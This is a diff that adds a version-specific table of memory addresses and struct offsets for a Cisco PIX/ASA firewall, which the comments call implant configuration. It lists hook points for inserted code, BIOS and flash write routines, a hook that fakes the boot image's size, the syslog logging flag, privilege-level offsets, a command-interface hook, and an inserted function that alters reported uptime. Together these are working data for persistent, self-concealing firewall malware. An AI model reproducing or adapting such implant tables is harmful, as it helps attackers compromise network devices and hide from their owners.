@@ -1,0 +1,148 @@
+; --- SECTION I ---
+;
+0x40082400            // pix version
+0x213a000             // address of implant configuration
+0x0   0x08ab8fe0      // allocb
+0x1   0x08ab8990      // freeb
+0x2   0x08066c90      // open (7.0(+) this is an array for Channel Stuff)
+0x3   0x08527110      // ip_put
+0x4   0x08066df0      // close
+0x5   0x092dd300      // atoip
+0x6   0x0931e5ac      // memset
+0x7   0x09300a90      // memmove
+0x8   0x09300230      // malloc_call_calloc
+0x9   0x09300050      // free
+0xa   0x08065fe0      // kprintf
+0xb   0x00000014      // interface offset in metaframe
+0xc   0x00000010      // offset for vlan number in interface struct
+0xd   0x00000094      // metaframe offset in block structure
+0xe   0x00000078      // interface semiphore in metaframe
+0xf   0x09302400      // rand
+0x15  0x08063590      // process_create
+0x16  0x08064a00      // process_suspend
+0x17  0x08064fe0      // process_sleep_for
+0x18  0x088dd750      // show_process
+0x19  0xffffff5c      // offset to security level in int_struct
+0x1a  0x00000000      // cur_t
+0x1b  0x04            // channel offset in interface struct
+0x1c  0x0c            // PUT offset in channel struct
+0x1d  0x24            // offset to dest mac in arp structure
+0x1e  0x10            // offset to next hop ip in route structure
+0x1f  0x20            // size of route struct
+0x20  0x08528260      // calc_ip_cksum
+0x21  0x08528d30      // arp_loopkup
+0x22  0x08527730      // set_block_hdr_mac_and_proto
+0x23  0x08539300      // get hardware interface
+0x24  0x08853e20      // get next hop
+0x25  0x088540e0      // get route
+0x26  0x085234c0      // send_it
+0x27  0x0852b5f0      // arp_create
+0x28  0x08938720      // get_hw_iface_2
+0x2a  0x64            // pointer to ethernet frame
+0x2b  0x5c            // wptr structure offset
+0x2c  0x44            // inIfc (incoming interface) structure offset
+0x2e  0x000001ac      // offset from cur_t that contains the current context number
+0x2f  0x09e4bee0      // pointer to channnel list
+0x30  0x09e3b930      // address of NIC database
+0x31  0x00000014      // offset to vlan struct in metaframe (interface offset)
+0x32  0x00000018      // offset to IP address in int_struct
+0x33  0x00000128      // iface struct adjust from metaframe
+0x34  0x09e59cf8      // max number of interface cards
+0x35  0x09f78828      // internal_clock
+0x36  0x089368b0      // get_interface_mac
+0x37  0x000000df      // offset to hardware interface number in interface struct
+0x38  0x10            // offset to ip in route structure
+0x39  0x00            // offset to interface num in route structure
+0x3a  0x00000424      // offset to send channel in channel list
+0x3b  0x0847bec0      // ifs_read; flash file read routine -- IFS: Read:
+0x3c  0x0847bfa0      // ifs_write; flash file write routine -- IFS: Write:
+0x3d  0x0847b500      // ifs_open; flash file open routine -- IFS: Opened: 
+0x3e  0x0847bde0      // ifs_close; flash file close routine -- IFS: Close: 
+0x3f  0x00000040      // offset to next IP fragment pointer in block
+0x40  0x09f9dc80      // address of context list
+0x42  0x0931bdb0      // checkheaps checksum location
+0x43  0x085167d0      // get booted image's filename
+0x44  0x083ada5f      // fix image size hook point
+0x45  0x01c916c4      // clean image file size
+0x46  0xffffffff      // asa fix image size hook point
+0x47  0x2c            // offset to filesize in file info struct
+0x52  0x0855e380      // ipv6_encap
+;
+; --- END OF SECTION I ---
+;
+:EOS:
+;
+; --- SECTION II ---
+;
+HookLocation              0x0870fdcb      // address of our hook point
+HookedCall                0x087143f0      // called function being hooked
+JmpLocation               0x091f395a      // empty area to jump to
+InterfaceAddr             0x09e3b930      // same as 0x30 above
+InterfaceLeng             0x000001a4      // length of interface struct
+IntSecurityOffset         0xffffff5c            // security level field offset
+IntNameOffset             0x00000174      // interface name field offset
+IntNumOffset              0x000000df      // interface number field offset
+IntVlanOffset             0x10            // same as 0xc above
+IntIPOffset               0x18            // ip address offset in the interface struct
+IntNetmaskOffset          0x1c            // netmask in the iface struct
+FlashClassAddr            0x00000000      // addr of flash structure (not used in 7.*)
+CryptoDeviceAddr          0xffffffff      // addr of crypto structure
+ArpTableAddrPtr           0x0999087c      // addr of first entry in ARP table
+NumInterfaces             0x00000000      // addr of pointer to number of interfaces (not used in 7.*)
+IfaceStruct2              0x00000000      // addr of pointer to second smaller interface struct (not used in 7.*)
+IfaceStruct2Len           0x00            // length of 2nd smaller interface struct used by arp cache (not used in 7.*)
+BiosClassAddr             0x09f8e160      // addr of the bios class structure
+BiosWriteAddr1            0x083a19c0      // addr of the bios write function for one specific bios
+BiosWriteAddr2            0x083a5000      // addr of the bios write function for one specific bios
+BiosWriteAddr3            0x083a4d80      // addr of the bios write function for one specific bios
+BiosWriteAddr4            0x083a5bd0      // addr of the bios write function for one specific bios
+BiosWriteOffset           0x00000020      // offset into the bios structure where write addr is located
+FlashMkdirAddress         0x0847cab0      // ifs_mkdir; make flash directory routine -- IFS: Mkdir
+ASAFlashRmdirAddress      0x083aecd0      // ifs_rmdir; remove flash directory routine for the asa
+PIXFlashRmdirAddress      0x083915a0      // ifs_rmdir; remove flash directory routine for the pix
+ASAFlashRmfileAddress     0x083ae3c0      // ifs_rmfile; remove flash file routine for the asa
+PIXFlashRmfileAddress     0x08391280      // ifs_rmfile; remove flash file routine for the pix
+FlashDirlistAddress       0x0847c1a0      // ifs_get_dir_entry; get the next file name from a directory listing
+FlashGetSizeAddress       0x0847cd90      // ifs_get_size; get the size of the provided open file
+FlashChmodAddress         0x0847c640      // ifs_chmod; change the permissions on a file
+FlashMoveFileAddress      0x0847c7a0      // ifs_rename; move a file
+FlashGetFileInfoAddress   0x00000000      // ifs_get_file_info; returns a structure that contains information about a file, including its size
+FlashGetSpaceAddress      0x0847dc60      // ifs_get_space_info; returns used and free space in flash
+FlashFileInfoSizeOffset   0x0000002c      // The offset to the file size in the structure returned by ifs_get_file_info
+GetPlatformStringAddr     0x093135b0      // The address of a function that returns the platform string 
+ASARestatFlashFlagAddr    0xffffffff      // The address of the flag that tells the OS on the ASA to re-stat the files in flash (causes used space to be updated)
+AnnounceFunc              0x08066aa0      // addr of the device announce function
+DevIoctlOffset            0x70            // offset to ioctl function in device table
+DuartTtyAddr              0x098f8960      // addr of duart/0 tty entry
+CIStartFunc               0x080cbe40      // addr of the command interface start function -- telnet function
+CommandListAddr           0x099ddde0      // addr of the command list -- first parameter of ci
+DeviceListPtrAddr         0x09da07f4      // pointer to the first entry in the device table -- find in announce
+DeviceNextPtrOffset       0x50            // offset into the device table entry which has pointer to next entry -- find in announce
+StrcmpFuncAddr            0x09306490      // address of strcmp -- search for 'strcmp'
+SyslogFlagPtrAddr         0x0a126ea0      // pointer to the logging flag. -- search for 'Syslog logging:'
+PGDGETValue               0x85b00002      // The value used for PGD_GET when calling the pager ioctl
+PGDPUSHValue              0x85b00003      // The value used for PGD_PUSH when calling the pager ioctl
+PGDSETValue               0x85b00000      // The value used for PGD_SET when calling the pager ioctl
+StdChOffset               0x84            // Offset into a thread struct containing the stdch pointer
+StdErrOffset              0x88            // Offset into a thread struct containing the stderr pointer
+PrivFlagOffset            0x0c            // offset into an environment struct containing the privilege level indicator
+UnameOffset               0x14            // offset into an environment struct containing the username 
+EnvPtrOffset              0x90            // offset into a thread struct containing the pointer to the environment struct  
+SyslogOffset              0x00000bc4      // offset into the syslog structure where the logging level is stored
+Open                      0x08066c90      // open
+ChannelConfigOffset       0x08            // offset into a channel where the configuration pointer is
+InputModeOffset           0x14            // offset into a duart config structure where the input mode is stored
+InputModeEsc              0x20            // Input mode used for entering escape sequence
+WatchDogTimeout           0x09885b04      // Address where the thread timeout value is stored 
+UpTimeCounter             0x09f78828      // Address of the up time counter
+Display_uptime_addr       0x080d5630      // Address of the function that display the uptime
+Inserted_code_addr        0x091f395a      // Address of the our insterted function to add time to the uptime
+i2cReadByte               0x092ec430      // read byte function needed to operate on the bios of the asa 5505
+i2cWriteByte              0x092ec5e0      // write byte function needed to operate on the bios of the asa 5505
+CLIHookAddress            0x080cc321      // Address of hook into the command interface
+AvailMemoryPtr            0x0a0c225c      // Address of total available memory
+;
+; --- END OF SECTION II ---
+;
+:EOS:
+;
